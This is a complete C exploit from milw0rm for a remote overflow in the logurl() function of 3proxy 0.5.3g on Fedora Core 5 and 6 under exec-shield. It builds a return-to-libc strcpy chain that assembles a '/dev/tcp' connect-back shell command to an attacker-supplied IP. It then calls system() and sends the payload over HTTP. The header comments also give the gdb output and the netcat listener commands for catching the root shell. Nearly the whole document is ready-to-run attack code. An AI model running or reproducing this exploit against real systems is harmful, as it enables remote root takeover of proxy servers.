<html><head><title>3proxy 0.5.3g proxy.c logurl() Remote Overflow Exploit (exec-shield)</title></head><pre>/*
**
** Fedora Core 5,6 (exec-shield) based
** 3proxy HTTP Proxy (3proxy-0.5.3g.tgz) remote overflow root exploit
** (reverse connect-back method) by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** Reference: http://www.securityfocus.com/bid/23545
** vendor: http://3proxy.ru/
**
** vade79/v9 v9@fakehalo.us (fakehalo/realhalo)'s exploit:
** http://www.milw0rm.com/exploits/3821 (x3proxy.c)
**
** --
** exploit by &quot;you dong-hun&quot;(Xpl017Elz), &lt;szoahc@hotmail.com&gt;.
** My World: http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** It is a relatively easy exploit case.
** It doesn't need any exec family functions or manipulating address of 
** system() function, popen() function. 
**
** It just needs simple set of strings to make a connect-back shell.
** for some hosts that don't have netcat, we organize attack code like this.
**
** --
** (gdb) x/s 0x08051e5c
** 0x8051e5c:       &quot;sh&lt;/dev/tcp/8282828282/56789&gt;/dev/tcp/8282828282/5678&quot;
** (gdb)
** --
**
** Let the 56789 port of attacker's server be opened and 
** when the attack is succeed hacker can SEND a COMMAND through the port.
**
** --
** $ nc -l -p 56789
** --
**
** Now, we open another port(this time 5678) on attacker's server and 
** when the attack is succeed hacer can GET a RESULT through the port.
**
** --
** $ nc -l -p 5678
** --
**
** It's very simple and easy!
**
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;

/*
** Fedora Core release 6 (Zod)
** 2.6.18-1.2798.fc6 #1
** locale (GNU libc) 2.5
** gcc version 4.1.1 20061011 (Red Hat 4.1.1-30)
** 3proxy HTTP Proxy 0.5.3g tarball src compile (3proxy-0.5.3g.tgz)
*/
#define FC6_STRCPY_PLT		0x08048e3c // &lt;strcpy@plt&gt;
#define FC6_MOVE_ESP		0x0804f7c5 // &lt;__do_global_ctors_aux&gt; epilogue

#define FC6_CMD_LOC		0x08051e5c
#define FC6_NULL_STR		0x08051e4c // 0x00000000

#define FC6_NUM			0x08050d74 // &quot;0&quot;
#define FC6_SH_STR		0x08048703 // &quot;fflush&quot;
#define FC6_REDIR_1		0x080481ec // &quot;&lt;\0&quot;
#define FC6_REDIR_2		0x0804e49b // &quot;&gt;\0&quot;
#define FC6_SLASH_STR		0x08050d7f // &quot;/\0&quot;
#define FC6_DEV_STR1		0x08050d5d // &quot;de&quot;
#define FC6_DEV_STR2		0x08050d6f // &quot;v&quot;
#define FC6_TCP_STR1		0x0805065f // &quot;/t&quot;
#define FC6_TCP_STR2		0x08048709 // &quot;strcpy&quot;
#define FC6_PORT_56789		0x08050d79 // &quot;56789+/&quot;

#define FC6_SYSTEM_PLT		0x08048cbc // &lt;system@plt&gt;

/*
** Fedora Core release 5 (Bordeaux)
** 2.6.15-1.2054_FC5 #1
** locale (GNU libc) 2.4
** gcc version 4.1.0 20060304 (Red Hat 4.1.0-3)
** 3proxy HTTP Proxy 0.5.3g tarball src compile (3proxy-0.5.3g.tgz)
*/
#define FC5_STRCPY_PLT		0x08049194 // &lt;strcpy@plt&gt;
#define FC5_MOVE_ESP		0x0804f9a6 // &lt;__do_global_ctors_aux&gt; epilogue

#define FC5_CMD_LOC		0x08051e5c
#define FC5_NULL_STR		0x08051e4c // 0x00000000

#define FC5_NUM			0x08050f54 // &quot;0&quot;
#define FC5_SH_STR		0x08048938 // &quot;fflush&quot;
#define FC5_REDIR_1		0x080495bc // &quot;&lt;\0&quot;
#define FC5_REDIR_2		0x0804e68b // &quot;&gt;\0&quot;
#define FC5_SLASH_STR		0x08049ec3 // &quot;/\0&quot;
#define FC5_DEV_STR1		0x08050f3d // &quot;de&quot;
#define FC5_DEV_STR2		0x08050f4f // &quot;v&quot;
#define FC5_TCP_STR1		0x0805083b // &quot;/t&quot;
#define FC5_TCP_STR2		0x080488e4 // &quot;strcpy&quot;
#define FC5_PORT_56789		0x08050f59 // &quot;56789+/&quot;

#define FC5_SYSTEM_PLT		0x08048ed4 // &lt;system@plt&gt;

int main(int argc,char *argv[]){
	u_long strcpy_plt;
	u_long move_esp;
	u_long cmd_loc;
	u_long null_str;
	u_long num;
	u_long sh_str;
	u_long redir_1;
	u_long redir_2;
	u_long slash_str;
	u_long dev_str1;
	u_long dev_str2;
	u_long tcp_str1;
	u_long tcp_str2;
	u_long port_56789;
	u_long system_plt;

	struct hostent *se;
	struct sockaddr_in saddr;
	unsigned char do_ex[4096];
	int i,l,sock;
	u_long ip,ip1,ip2,ip3,ip4;
	unsigned char attacker_ip[256];
	char host[256];
	int port=3128;

	ip=ip1=ip2=ip3=ip4;
	memset((char *)do_ex,0,sizeof(do_ex));

	printf(&quot;/*\n**\n** Fedora Core 5,6 (exec-shield) based\n&quot;
		&quot;** 3proxy HTTP Proxy (3proxy-0.5.3g.tgz) remote overflow root exploit\n&quot;
		&quot;** by Xpl017Elz\n**\n&quot;);
	if(argc&lt;5){
		printf(&quot;** Usage: %s [host] [port] [attacker ip] [type]\n&quot;,argv[0]);
		printf(&quot;**\n** host: 3proxy HTTP Proxy server\n&quot;);
		printf(&quot;** port: default 3128\n&quot;);
		printf(&quot;** attacker ip: attacker netcat host\n&quot;);
		printf(&quot;** type: {0} - Fedora Core release 5 (Bordeaux), exec-shield default enabled.\n&quot;);
		printf(&quot;**       {1} - Fedora Core release 6 (Zod), exec-shield default enabled.\n**\n&quot;);
		printf(&quot;** Example: %s 3proxy.use_host.co.kr 3128 82.82.82.82 1\n**\n*/\n&quot;,argv[0]);
		exit(-1);
	}
	if(atoi(argv[4])){
		strcpy_plt=FC6_STRCPY_PLT;
		move_esp=FC6_MOVE_ESP;
		cmd_loc=FC6_CMD_LOC;
		null_str=FC6_NULL_STR;
		num=FC6_NUM;
		sh_str=FC6_SH_STR;
		redir_1=FC6_REDIR_1;
		redir_2=FC6_REDIR_2;
		slash_str=FC6_SLASH_STR;
		dev_str1=FC6_DEV_STR1;
		dev_str2=FC6_DEV_STR2;
		tcp_str1=FC6_TCP_STR1;
		tcp_str2=FC6_TCP_STR2;
		port_56789=FC6_PORT_56789;
		system_plt=FC6_SYSTEM_PLT;
	} else {
		strcpy_plt=FC5_STRCPY_PLT;
		move_esp=FC5_MOVE_ESP;
		cmd_loc=FC5_CMD_LOC;
		null_str=FC5_NULL_STR;
		num=FC5_NUM;
		sh_str=FC5_SH_STR;
		redir_1=FC5_REDIR_1;
		redir_2=FC5_REDIR_2;
		slash_str=FC5_SLASH_STR;
		dev_str1=FC5_DEV_STR1;
		dev_str2=FC5_DEV_STR2;
		tcp_str1=FC5_TCP_STR1;
		tcp_str2=FC5_TCP_STR2;
		port_56789=FC5_PORT_56789;
		system_plt=FC5_SYSTEM_PLT;
	}

	sscanf(argv[3],&quot;%d.%d.%d.%d&quot;,&amp;ip1,&amp;ip2,&amp;ip3,&amp;ip4);
#define IP1 16777216
#define IP2 65536
#define IP3 256
	ip=0;
	ip+=ip1 * (IP1);
	ip+=ip2 * (IP2);
	ip+=ip3 * (IP3);
	ip+=ip4;

	memset((char *)attacker_ip,0,256);
	sprintf(attacker_ip,&quot;%10lu&quot;,ip);

	memset((char *)host,0,sizeof(host));
	strncpy(host,argv[1],sizeof(host)-1);
	port=atoi(argv[2]);
	
	se=gethostbyname(host);
	if(se==NULL){
		printf(&quot;** gethostbyname() error\n**\n*/\n&quot;);
		return -1;
	}
	sock=socket(AF_INET,SOCK_STREAM,0);
	if(sock==-1){
		printf(&quot;** socket() error\n**\n*/\n&quot;);
		return -1;
	}

	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(port);
	saddr.sin_addr=*((struct in_addr *)se-&gt;h_addr);
	bzero(&amp;(saddr.sin_zero),8);

	printf(&quot;** make exploit\n&quot;);
	sprintf(do_ex,&quot;GET /&quot;);
	l=strlen(do_ex);
	for(i=0;i&lt;1800-444;i++,l++){
		sprintf(do_ex+l,&quot;A&quot;);
	}

#define __GOGOSSING(dest,index,src){\
	*(long *)&amp;dest[index]=src;\
	index+=4;\
}

	l=0;
	__GOGOSSING(do_ex,i,move_esp); /* 0x0d filter */
	__GOGOSSING(do_ex,i,0x0d0d0d0d);
	__GOGOSSING(do_ex,i,0x0d0d0d0d);

	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,sh_str);
	l+=2; /* &quot;sh&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,redir_1);
	l+=1; /* &quot;&gt;&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,slash_str);
	l+=1; /* &quot;/&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,dev_str1);
	l+=2; /* &quot;de&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,dev_str2);
	l+=1; /* &quot;v&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,tcp_str1);
	l+=2; /* &quot;/t&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,tcp_str2);
	l+=2; /* &quot;cp&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,slash_str);
	l+=1; /* &quot;/&quot; */

	/* IP address part */
	for(ip=0;ip&lt;10;ip++){
		__GOGOSSING(do_ex,i,strcpy_plt);
		__GOGOSSING(do_ex,i,move_esp);
		__GOGOSSING(do_ex,i,cmd_loc+l);
		
		switch(attacker_ip[ip]){
			case '0':
				__GOGOSSING(do_ex,i,num);
				break;
			case '1':
				__GOGOSSING(do_ex,i,num+1);
				break;
			case '2':
				__GOGOSSING(do_ex,i,num+2);
				break;
			case '3':
				__GOGOSSING(do_ex,i,num+3);
				break;
			case '4':
				__GOGOSSING(do_ex,i,num+4);
				break;
			case '5':
				__GOGOSSING(do_ex,i,num+5);
				break;
			case '6':
				__GOGOSSING(do_ex,i,num+6);
				break;
			case '7':
				__GOGOSSING(do_ex,i,num+7);
				break;
			case '8':
				__GOGOSSING(do_ex,i,num+8);
				break;
			case '9':
				__GOGOSSING(do_ex,i,num+9);
				break;
		}
		l+=1;
	}
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,slash_str);
	l+=1; /* &quot;/&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,port_56789);
	l+=5; /* &quot;56789&quot; */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,redir_2);
	l+=1; /* &quot;&gt;&quot; */
	
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,null_str);
	/* null */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,null_str-40);
	__GOGOSSING(do_ex,i,cmd_loc+3);
	/* copy, &quot;/dev/tcp/ip_addr/port&quot; */
	
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,null_str-40);
	l+=24; /* &quot;/dev/tcp/ip_addr/port&quot; */

	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,null_str); /* port number: 5678 */

	/* system() plt */
	__GOGOSSING(do_ex,i,system_plt);
	__GOGOSSING(do_ex,i,0x82828282);
	__GOGOSSING(do_ex,i,cmd_loc);

	sprintf(do_ex+i,&quot;\nHost: &quot;);
	i=strlen(do_ex);
	for(l=0;l&lt;700;l++){
		do_ex[i++]='A';
	}
	do_ex[i++]='\n';
	do_ex[i++]='\n';
	printf(&quot;** total packet size: %d\n&quot;,strlen(do_ex));

	l=connect(sock,(struct sockaddr *)&amp;saddr,sizeof(struct sockaddr));
	if(l==-1){
		printf(&quot;** connect() error\n**\n*/\n&quot;);
		return -1;
	}
	else {
		printf(&quot;** send exploit\n&quot;);
		send(sock,do_ex,i,0);
	}
	close(sock);
	printf(&quot;** attacker host, check it up, now!\n**\n*/\n&quot;);	
	exit(0);
}

/* eox */

// milw0rm.com [2007-05-02]</pre></html>